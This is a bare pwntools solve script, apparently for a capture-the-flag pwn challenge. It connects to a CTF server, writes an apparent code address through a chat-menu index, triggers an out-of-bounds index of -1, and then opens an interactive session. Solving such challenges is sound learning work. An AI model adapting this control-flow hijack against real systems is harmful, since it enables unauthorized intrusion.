from pwn import *
#io=process('./pwn')
io=remote("nc1.ctfplus.cn",24331)
io.send(b'a'*5)
io.sendlineafter(b"Choice: ",b"6")

#0x1A
io.sendlineafter(b"Enter chat index : ",b"26")

io.sendlineafter(b"Choice: ",b"2")

io.sendline(b"4203015")

io.sendlineafter(b"Enter chat index : ",b"-1")

io.interactive()